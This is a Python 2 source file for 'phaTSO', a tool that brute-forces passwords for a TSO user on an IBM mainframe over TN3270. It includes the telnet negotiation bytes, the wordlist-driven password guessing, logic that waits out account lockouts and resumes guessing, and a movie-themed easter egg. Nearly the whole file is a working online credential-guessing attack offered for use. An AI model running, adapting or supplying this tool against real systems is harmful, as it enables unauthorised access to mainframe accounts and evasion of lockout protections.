#!/usr/bin/python

import curses, random, signal, os, time, sys, argparse, re, socket
from Queue import Queue
from select import select


#--------------------------\
# catch the ctrl-c to exit and say something instead of Punt!
#--------------------------/
def signal_handler(signal, frame):
        print "EXCELSIOR!" + bcolors.ENDC
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

###############################################################
###############################################################
###############################################################
# If the script doesn't work you need to change me by sniffing your connection and see what row/column
# and command you need to run. For now it works on ADCD
tso_command = "\x7d\xd9\xd8\x11\xd9\xd5\xa3\xa2\x96\xff\xef" #Putting TSO at row 21 column 22
###############################################################
###############################################################
###############################################################
#EBCDIC/ASCII converter, customize by me for use here
# from http://www.pha.com.au/kb/index.php/Ebcdic.py
a2e = [
      0,  1,  2,  3, 55, 45, 46, 47, 22,  5, 21, 11, 12, 13, 14, 15,
     16, 17, 18, 19, 60, 61, 50, 38, 24, 25, 63, 39, 28, 29, 30, 31,
     64, 79,127,123, 91,108, 80,125, 77, 93, 92, 78,107, 96, 75, 97,
    240,241,242,243,244,245,246,247,248,249,122, 94, 76,126,110,111,
    124,193,194,195,196,197,198,199,200,201,209,210,211,212,213,214,
    215,216,217,226,227,228,229,230,231,232,233, 74,224, 90, 95,109,
    121,129,130,131,132,133,134,135,136,137,145,146,147,148,149,150,
    151,152,153,162,163,164,165,166,167,168,169,192,106,208,161,  7,
     32, 33, 34, 35, 36, 21,  6, 23, 40, 41, 42, 43, 44,  9, 10, 27,
     48, 49, 26, 51, 52, 53, 54,  8, 56, 57, 58, 59,  4, 20, 62,225,
     65, 66, 67, 68, 69, 70, 71, 72, 73, 81, 82, 83, 84, 85, 86, 87,
     88, 89, 98, 99,100,101,102,103,104,105,112,113,114,115,116,117,
    118,119,120,128,138,139,140,141,142,143,144,154,155,156,157,158,
    159,160,170,171,172,173,174,175,176,177,178,179,180,181,182,183,
    184,185,186,187,188,189,190,191,202,203,204,205,206,207,218,219,
    220,221,222,223,234,235,236,237,238,239,250,251,252,253,254,255
    ]

e2a = [
      0,  1,  2,  3,156,  9,134,127,151,141, 11, 11, 12, 13, 14, 15,
     16, 17, 18, 19,157, 10,  8,135, 24, 25,146,143, 28, 29, 30, 31,
    128,129,130,131,132, 10, 23, 27,136,137,138,139,140,  5,  6,  7,
    144,145, 22,147,148,149,150,  4,152,153,154,155, 20, 21,158, 26,
     32,160,161,162,163,164,165,166,167,168, 91, 46, 60, 40, 43, 33,
     38,169,170,171,172,173,174,175,176,177, 93, 36, 42, 41, 59, 94,
     45, 47,178,179,180,181,182,183,184,185,124, 44, 37, 95, 62, 63,
    186,187,188,189,190,191,192,193,194, 96, 58, 35, 64, 39, 61, 34,
    195, 97, 98, 99,100,101,102,103,104,105,196,197,198,199,200,201,
    202,106,107,108,109,110,111,112,113,114,203,204,205,206,207,208,
    209,126,115,116,117,118,119,120,121,122,210,211,212,213,214,215,
    216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,
    123, 65, 66, 67, 68, 69, 70, 71, 72, 73,232,233,234,235,236,237,
    125, 74, 75, 76, 77, 78, 79, 80, 81, 82,238,239,240,241,242,243,
     92,159, 83, 84, 85, 86, 87, 88, 89, 90,244,245,246,247,248,249,
     48, 49, 50, 51, 52, 53, 54, 55, 56, 57,250,251,252,253,254,255
]

def AsciiToEbcdic(s):
    if type(s) != type(""):
        raise "Bad data", "Expected a string argument"

    if len(s) == 0:  return s

    new = ""

    for i in xrange(len(s)):
        new += chr(a2e[ord(s[i])])

    return new

def EbcdicToAscii(s):
    if type(s) != type(""):
        raise "Bad data", "Expected a string argument"

    if len(s) == 0:  return s

    new = ""

    for i in xrange(len(s)):
        new += chr(e2a[ord(s[i])])

    return new



class bcolors:
    BLUE = '\033[94m'
    DARKBLUE = '\033[0;34m'
    PURPLE = '\033[95m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[1;37m'
    ENDC = '\033[0m'
    DARKGREY = '\033[1;30m'
    

    def disable(self):
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
	self.DARKBLUE = ''
	self.PURPLE = ''
	seld.WHITE= ''
        self.RED = ''
        self.ENDC = ''

def logo():
	print '''
  \033[92mssss, ,sss,  ssss,        .sssssssss  \033[91mssssssssssss  ssss'"'ss    ssss'"'ss
  \033[92m$$$$'"`$$$   $$$$'"`$$$        `$$$$  \033[91m   $$$$'      $$$$   $$$   $$$$   $$$
  \033[92m$$$$   $$$   $$$$   $$$   $$$'"'$$$$  \033[91m    $$$$      `"Ss,, """   $$$$   $$$
  \033[92m$$$$   $$$   $$$$   $$$   $$$   $$$$  \033[91m    $$$$      Ss,. ""ss    $$$$   $$$
  \033[92m$$$$.sS$"'   $$$$   $$$   $$$   $$$$  \033[91m    $$$$      $$$$   $$$   $$$$   sSS
  \033[92m$$$$'        $$$$   $$$   $$$   $$$$  \033[91m    $$$$      $$$$   $$$   $$$$   $$$
\033[1;30m% \033[92m$$$$ \033[1;30m%%%%%%%%%%%%%% \033[92m''" \033[1;30m% \033[92m`"'ssssssS$"' \033[1;30m% \033[91m'$$$ \033[1;30m%%%% \033[91m'"Sss,s'"' \033[1;30m% \033[91m`"Sss,s'"" \033[1;30m%%
\033[1;30m%%\033[92m "'' \033[1;30m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \033[91m"'' \033[1;30m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\033[1;30m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
`$$$$'"`$$$$'"`$$$$'"`$$$$'"`$$$$'"`$$$$'"`$$$$'"`$$$$'"`$$$$'"`$$$$'"`$$$$'"`$$
 `$$'   `$$'   `$$'   `$$'   `$$'   `$$'   `$$'   `$$'   `$$'   `$$'   `$$'   `$
  I'     I'     I'     I'     I'     I'     I'     I'     I'     I'     I'     l
  ;      ;      ;      ;      ;      ;      ;      ;      ;      ;      ;      ;
'''


# from https://gist.github.com/msimpson/1096950
# I didn't write this. - SoF
def flames(cycles):
	screen  = curses.initscr()
	width   = screen.getmaxyx()[1]
	height  = screen.getmaxyx()[0]
	size    = width*height
	char    = [" ", ".", ":", "^", "*", "x", "s", "S", "#", "$"]
	b       = []
 
	curses.curs_set(0)
	curses.start_color()
	curses.init_pair(1,0,0)
	curses.init_pair(2,1,0)
	curses.init_pair(3,3,0)
	curses.init_pair(4,4,0)
	screen.clear
	for i in range(size+width+1): b.append(0)
	 
	for w in xrange(cycles):
	        for i in range(int(width/9)): b[int((random.random()*width)+width*(height-1))]=65
	        for i in range(size):
	                b[i]=int((b[i]+b[i+1]+b[i+width]+b[i+width+1])/4)
	                color=(4 if b[i]>15 else (3 if b[i]>9 else (2 if b[i]>4 else 1)))
	                if(i<size-1):   screen.addstr(  int(i/width),
	                                                i%width,
	                                                char[(9 if b[i]>9 else b[i])],
	                                                curses.color_pair(color) | curses.A_BOLD )
	 
	        screen.refresh()
	        screen.timeout(30)
	        if (screen.getch()!=-1): break
	 
	curses.endwin()

def co(stringer): #Old School Printer
    for c in stringer:
	sys.stdout.write( c )
        sys.stdout.flush()
        time.sleep(random.uniform(0, 0.35))
    print "\n",

def printer(s):
    for c in s:
	sys.stdout.write( c )
        sys.stdout.flush()
        time.sleep(random.uniform(0, 0.01))
    print "\n",

def ab(s):
    for c in s:
	sys.stdout.write( c )
        sys.stdout.flush()
        time.sleep(random.uniform(0, 0.2))
    print "\n",


def hackers_egg():
	print bcolors.GREEN
	co("ATD2125554240")
	printer("DIALING 212-555-4240\nCONNECTING....")
	time.sleep(2)
	print bcolors.PURPLE
	print "        ="
	print "        ===                                                      09/15/1995"
	print "        ====                     OTV Programming: (212)-555-4240"
	time.sleep(random.random())	
	print "        ====="
	print "       =======                   Welcome to the NYC Programming Management"
	time.sleep(random.random())	
	print "     =========                   System of OTV. Unauthorized use is stricly"
	print "    ==========                   prohibited."
	time.sleep(random.random())	
	print "   =========="
	time.sleep(random.random())	
	print "  ==========                     Help/Support: (212)-555-4321"
	print "  ========="
	time.sleep(random.random())	
	print "  ======= _____ _____ _____      1) Ad Billing Reports"
	print "   ===== |     |_   _|  |  |     2) Finance Application Access"
	time.sleep(random.random())	
	print "    ==== |  |  | | | |  |  |     3) ARPS - DO NOT TOUCH!! -j"
	print "     === |_____| |_|  \___/      4) Tape Cartridge Cataloge"
	print "       ="
	print "\n  Please Enter application choice:"
	time.sleep(2)
	print bcolors.GREEN
	print "3"
	time.sleep(random.random())
	print bcolors.BLUE	
	printer('''\n\n     Welcome to ARPS please select region/channel:
      1) ARPS 342  - PRE-ROLL
      2) ARPS 331  - ON AIR!
      3) ARPS 217  - TEST SYSTEM
      4) ARPS 564  - KYRON
      5) ARPS 423  - DECOMISSIONED
      6) EMTPY
      7) EMPTY\n''')

	time.sleep(3)
	print bcolors.GREEN
	co("ARPS 331")
	print bcolors.YELLOW
	ab("  ENTERING\n  ARPS 331")
	time.sleep(2)
	printer('''
       _
      / \\
     / _ \    utomated          -----------------------------------------
    / ___ \                     -                                       -
  _/ /   \ \_                   - WARNING WARNING WARNING WARNING WARNI -
 |____|_|____|                  - NG WARNING WARNING WARNING WARNING WA -
   ______                       -                                       -
  |_   __ \                     -                                       -
    | |__) |                    -   This systems is currently:          -
    |  __ /   ecording          -                 ON-AIR                -
   _| |  \ \_                   -                                       -
  |____|_|___|                  -          Make changes to              -
   ______                       -          the Schedule first.          -
  |_   __ \                     -                                       -
    | |__) |  layback           -          Only Use this System         -
    |  ___/                     -          for EMERGENCIES              -
   _| |_                        -                                       -
  |_____|_                      -                                       -
    _____                       -                                       -
  .' ____ \                     - RNING WARNING WARNING WARNING WARNING -
  | (___ \_|                    - WARNING WARNING WARNING WARNING WARN  -
   _.____`.  ystem              -                                       -
  | \____) |                    -----------------------------------------
   \______.'
''')

	print bcolors.GREEN
	co("E 00-06")
	print bcolors.YELLOW
	printer("EJECTING TAPE IN PLAYER 00-06")
	print bcolors.GREEN
	co("I 03-19")
	print bcolors.YELLOW
	printer("INSERTED TAPE 03-19 IN PLAYER 00-06\nPLAYING TAPE 03-19: Outer Limits 304")
	time.sleep(5)
	os.system("clear")
	flames(35)
	print bcolors.RED
	co( '''\n\n\
   U HAVE TREAD
   UPON MY DOMAIN &
   MUST NOW SUFFER

     WHO R U?
''' )
	print bcolors.GREEN
	time.sleep(2)
	co("   ZERO\b\b\b\bCRASH OVERRIDE")
	co("   WHO WANTS TO KNOW?")
	time.sleep(2)
	os.system("clear")
	flames(40)
	print bcolors.RED
	co('''\n\n\n\t\t\tACID BURN\n\n''')
	print bcolors.YELLOW
	printer("TAPE 03-19 EJECTED FROM PLAYER 00-06")
	time.sleep(2)
	print bcolors.GREEN
	co("E 00-06,I 05-17")
	print bcolors.YELLOW
	printer("TAPE 00-89 EJECTED FROM PLAYER 00-06\nINSERTED TAPE 05-17")
	time.sleep(4)
	os.system("clear")
	flames(15)
	print bcolors.RED
	ab('''      ACID BURN
     SEZ LEAVE B 4
     U R EXPUNGED
''')

	print bcolors.YELLOW
	printer("TAPE ARM 2-345 HAS LOST TAPE 12-1094\nTAPE ARM 2-345 HAS REGAINED TAPE 12-1094\nTAPE 12-1094 INSERTED")
	time.sleep(4)
	os.system("clear")
	flames(15)
	print bcolors.RED
	ab('''        I WILL
     SWAT U LIKE
     THE FLY U R''')

	print bcolors.GREEN
	co("M 12-1094,R 12-1094")
	print bcolors.YELLOW
	printer("TAPE ARM 2-354 ENTERING IN TO MAINTENANCE MODE\nREMOVING TAPE 12-1094 FROM CATALOG")
	print bcolors.GREEN
	co("I 03-85")
	print bcolors.YELLOW
	printer("TAPE 03-85 INSERTED IN TO PLAYER 00-06\n\n")

	time.sleep(3)
	os.system("clear")
	flames(15)
	print bcolors.RED
	ab('''        I WILL
     SNAP YOUR BACK
     LIKE A TOOTHPICK''')


	print bcolors.YELLOW
	printer("TAPE 03-85 EJECT & REMOVED FROM PLAYER 00-06\nTAPE 445-4 INSERTED IN TO PLAYER 00-06")

	print bcolors.GREEN
	co("   MESS WITH THE BEST\n   DIE LIKE THE REST")
	time.sleep(4)
	os.system("clear")
	flames(15)
	print bcolors.RED
	ab('''        YOU ARE
       TERMINATED''')
	time.sleep(1)
	print bcolors.WHITE
	printer("CONNECTION TERMINATED")

	print bcolors.ENDC
	sys.exit(0)




#start argument parser
parser = argparse.ArgumentParser(description='phaTSO: TSO User Brute Forcer ')
parser.add_argument('-t','--target', help='Mainframe IP address or Hostname', required=True,dest='target')
parser.add_argument('-p','--port', help='Mainframe 3270 server port number, default is port 23', required=False,default="23",dest='port')
parser.add_argument('-s','--sleep',help='Seconds to sleep. !only change if you have problems connecting!. The default is 4 seconds.',default=4,type=int,dest='sleep')
parser.add_argument('-u','--userid',help='The user you wish to bruteforce',dest='userid', required=True)
parser.add_argument('-w','--wordlist',help='Password file to use for bruteforcing.',required=True,dest='wordlist')
parser.add_argument('-x','--wait',help='Time to wait for userID to become unlocked, in seconds. Default 45.',default=45,type=int,dest='wait')
parser.add_argument('-q','--quiet',help='Don\'t show all attempts, just discovered users',default=True,dest='quiet',action='store_false')
parser.add_argument('-l','--nologo',help='Do not display the logo',default=True,dest='logo',action='store_false')
parser.add_argument('-v','--verbose',help='Be verbose',default=False,dest='verbose',action='store_true')
args = parser.parse_args()
results = parser.parse_args() # put the arg results in the variable results

if results.logo: logo()

if results.userid == "ACIDBURN" and results.port == "95":
	hackers_egg()


if results.userid[0].isdigit() or len(results.userid.strip()) > 7:# or re.match(r"\W", results.tso_fake): 
	print bcolors.RED+"[!]You entered an invalid TSO userID with -u. The rules are: <=7, cannot start with a number and only letters/numbers"
	print "       you entered",results.userid,""+bcolors.ENDC
	sys.exit(0)

print bcolors.PURPLE + " Target System \t: " +bcolors.WHITE+ "" + results.target
print bcolors.PURPLE + " Username\t\t: " +bcolors.WHITE+ "" + results.userid
print bcolors.PURPLE + " paSsw0Rd phIle\t: " +bcolors.WHITE+ "" + results.wordlist

wordlist=open(results.wordlist)
passwords = Queue() #for eventual threading
total_passwords = 0
skipped = 0
for password in wordlist:
#TSO has weird rules for the user name so this checks that:
# - The username doesn't start with a number
# - It's not longer than 7 chars
# - It only contains A-z, 0-9, #, @ and $
	if len(password.strip()) <= 8 and re.match('^[a-zA-Z0-9#$@]*$', password.strip()): 
		passwords.put(password.strip()) #using a queue for eventually adding threading. 
		total_passwords += 1
	else:
		if results.verbose: print bcolors.RED + "     [!] skipping "+bcolors.WHITE+ password.strip()
		skipped += 1
print bcolors.PURPLE + " Total passwords\t: " +bcolors.WHITE+ "" + str(total_passwords)
print bcolors.PURPLE + " Skipped passwords\t: " +bcolors.WHITE+ "" + str(skipped)

for i in xrange(1000): #for threading to be added at a later date
	passwords.put(None)
#-------------------------| You could begin threading here |-------------------------
try:
	MFsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	MFsock.connect( (results.target, int(results.port)) )
	MFsock.setblocking(0)
except Exception, e:
 	print  bcolors.RED + "[ERR] could not connect to ",results.target,":",results.port,"" + bcolors.ENDC
	print bcolors.RED + "",e,"" + bcolors.ENDC
	sys.exit(0)

###################################################
# Declarations. It ain't got no aliby. Should look familiar to psikotik ;)
########
at_screen = False #This is used below to send the TSO command in the stream. There's no way to tell when the MF screen shows up otherwise.
its_brutus_time = False #Connect to the mainframe. Then start guessing when this becomes true
done = False #such hackery 
pouring_one_out = "\x40" #space-balls
too_many = False # Make sure we don't skip a password if we reach the max guesses

#print bcolors.PURPLE+"    Ultra Hyper-Threading Technology:"+bcolors.RED+" ON" #It's actually just normal threads. But, meh. When threading is added this will be enabled. 

while not done:
	r, w, e = select([MFsock], [], [MFsock])
	for i in r:
		try:
			buffer = MFsock.recv(1280)
			while( buffer  != ''):
				ascii_out = EbcdicToAscii(buffer)
				#print buffer.encode("hex")
				#print ascii_out
				buffer = MFsock.recv(1280)
		                if(buffer == ''):
					break
		except socket.error:
        	        pass

	if re.match("\xFF\xFD\x18$",buffer): #You need uppercase hex values for re.match ...,,,;;;;:::::The more you know (nbclogo)
		MFsock.send("\xff\xfb\x18") # Will Terminal type

	if re.match("\xFF\xFA\x18\x01\xFF\xF0$",buffer): MFsock.send("\xff\xfa\x18\x00\x49\x42\x4d\x2d\x33\x32\x37\x39\x2d\x32\x2d\x45\xff\xf0") #Sending terminal type IBM-3279-2-E
	if re.match ("\xFF\xFD\x19\xFF\xFB\x19$",buffer): MFsock.send("\xff\xfb\x19\xff\xfd\x19") # Will end of record/Do End of record
	if re.match("\xFF\xFD\x00\xFF\xFB\x00$",buffer): 
		MFsock.send("\xff\xfb\x00\xff\xfd\x00") # Will Binary Tranmission/Do Binary Transmission
		at_screen = True
	if at_screen and re.search("\xFF\xEF$",buffer): 
		time.sleep(results.sleep) #the hackiest work around
		at_screen = False
		if results.verbose: print bcolors.YELLOW + "    [!]Sending TSO command"
		MFsock.send(tso_command) #Putting TSO command	
	if re.match("\xF3\x00\x06\x40\x00\xF1\xC2\x00\x05\x01\xFF\xFF\x02\xFF\xEF$",buffer):
		MFsock.send("\x88\x00\x16\x81\x86\x00\x08\x00\xf4\xf1\xf1\xf2\xf2\xf3\xf3\xf4\xf4\xf5\xf5\xf6\xf6\xf7\xf7\x00\x0d\x81\x87\x04\x00\xf0\xf1\xf1\xf2\xf2\xf4\xf4\x00\x22\x81\x85\x82\x00\x07\x10\x00\x00\x00\x00\x07\x00\x00\x00\x00\x65\x00\x25\x00\x00\x00\x02\xb9\x00\x25\x01\x00\xf1\x03\xc3\x01\x36\x00\x2e\x81\x81\x03\x00\x00\x50\x00\x18\x00\x00\x01\x00\x48\x00\x01\x00\x48\x07\x10\x00\x00\x00\x00\x00\x00\x13\x02\x00\x01\x00\x50\x00\x18\x00\x00\x01\x00\x48\x00\x01\x00\x48\x07\x10\x00\x1c\x81\xa6\x00\x00\x0b\x01\x00\x00\x50\x00\x18\x00\x50\x00\x18\x0b\x02\x00\x00\x07\x00\x10\x00\x07\x00\x10\x00\x07\x81\x88\x00\x01\x02\x00\x16\x81\x80\x80\x81\x84\x85\x86\x87\x88\xa1\xa6\xa8\x96\x99\xb0\xb1\xb2\xb3\xb4\xb6\x00\x08\x81\x84\x00\x0a\x00\x04\x00\x06\x81\x99\x00\x00\xff\xef") #Whoa! Look it up. 
	if re.match("\xF1\xC2\xFF\xEF$",buffer) or re.search("\xF1\xC2\x11\x40\x40\x1D\xC8\xC9\xD2\xD1\xF5\xF6\xF7\xF0\xF0",buffer): 
		if results.verbose: print bcolors.YELLOW+"    [!]Sending UserID: "+bcolors.BLUE+ results.userid
		MFsock.send("\x7d\xc1\xd5\x11\x40\x5a"+AsciiToEbcdic(results.userid)+"\xff\xef")
	if re.search("\xC8"+AsciiToEbcdic(results.userid.upper()),buffer): #c8 + userid = bad :(
		print bcolors.RED+"    [!]At TSO with a an invalid UserID: "+results.userid+". Please supply a valid user"+ bcolors.ENDC
		sys.exit(1)
	elif re.search("\xE8"+AsciiToEbcdic(results.userid.upper()),buffer): #e8 + userid matches a known user
		if results.verbose: print bcolors.BLUE+"    [!]At TSO: "+bcolors.GREEN+"!!!!!Start FORCIN'!!!!!"
		its_brutus_time = True #no dad, no :,(
		if not too_many: passwd = passwords.get()
		if results.quiet: print bcolors.YELLOW+"    [+] Trying: "+bcolors.RED+passwd,
		encoded = AsciiToEbcdic(passwd)+pouring_one_out*(8-len(passwd))
		MFsock.send("\x7d\xc9\xc4\x11\xc9\xc3"+encoded+"\xff\xef")
	########
	####
	# Phew, after all that we can now start brute forcing users. Sorta
	####
	########
	while its_brutus_time:

		r, w, e = select([MFsock], [], [MFsock])
		for i in r:
			try:
				buffer = MFsock.recv(1280)
				while( buffer  != ''):
					ascii_out = EbcdicToAscii(buffer)
					#print buffer.encode("hex")
					#print bcolors.WHITE+ascii_out
					buffer = MFsock.recv(1280)
			                if(buffer == ''):
						break
			except socket.error:
        	        	pass


		if re.search("LOGON REJECTED, TOO MANY ATTEMPTS",ascii_out): #some systems boot you after too many attempts but don't lock the account. Lets catch that and then continue
			if results.verbose: print bcolors.YELLOW+"\n    [!]LOGON REJECTED, TOO MANY ATTEMPTS: Restarting"
			at_screen = True
			its_brutus_time = False
			too_many = True
			time.sleep(results.sleep)
			if not results.verbose and results.quiet: print "\t - Pop! Pop!" #Magnitude!

		if re.search("REVOKING USER ACCESS",ascii_out): #some systems revoke the account after too many tries. Catch that as well and wait for the account to reactivate.
			print bcolors.YELLOW+"\n    [!]Account Locked!! sleeping for", results.wait,"seconds."
			at_screen = True
			its_brutus_time = False
			too_many = True
			print bcolors.WHITE+"     ",
			for i in xrange(results.wait):
					j = "\b"+str(i)
					sys.stdout.write( j )
					sys.stdout.flush()
					time.sleep(i)
		
		elif re.search("PASSWORD NOT AUTHORIZED",ascii_out):
			if results.quiet: print bcolors.BLUE+"\t - ah ah ah! You didn't say the magic word!"
			passwd = passwords.get()
			if passwd == None: 
				done = True
				break
			if results.quiet: print bcolors.YELLOW+"    [+] Trying:"+bcolors.RED+"",passwd,
			encoded = AsciiToEbcdic(passwd)+pouring_one_out*(8-len(passwd))
			count += 1
			MFsock.send("\x7d\xc9\xc4\x11\xc9\xc3"+encoded+"\xff\xef")

		elif re.search("UserId "+results.userid.upper()+" already logged",ascii_out): #if a user is logged in this error will show. Catch it and display the result
			print bcolors.RED+"\t - ERROR!! ERROR!! ERROR!! ERROR!! ERROR!! ERROR!!"+bcolors.WHITE+"\n    "+bcolors.RED+"[!]"+bcolors.WHITE+" The user "+bcolors.GREEN+results.userid.upper()+bcolors.WHITE+" is currently logged on. Please wait until they logoff to\n        brute force their account. "
			done = True;
			break
		elif re.search("LOGON IN PROGRESS",ascii_out):
			if results.quiet: print bcolors.GREEN+"\t <------ This is the password!"
			else: print bcolors.YELLOW+"\n[+] Valid Password Found for",results.userid,":"+bcolors.GREEN+passwd
			done = True;
			break
		

#-------------------------| and end threading here |-------------------------




if results.logo:
	print bcolors.DARKGREY+'''
  ;    ;    ;    ;    ;    ;    ;    ;     ;    ;    ;    ;    ;    ;    ;    ;
  i    i    i    i    i    i    i    i     i    i    i    i    i    i    i    i
  $.   $.   $.   $.   $.   $.   $.   $.   .$   .$   .$   .$   .$   .$   .$   .$
 .$$. .$$. .$$. .$$. .$$. .$$. .$$. .$$. .$$. .$$. .$$. .$$. .$$. .$$. .$$. .$$.
.s$$s.s$$s.s$$s.s$$s.s$$s.s$$s.s$$s.s$$s.s$$s.s$$s.s$$s.s$$s.s$$s.s$$s.s$$s.s$$s
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
'''

print bcolors.ENDC
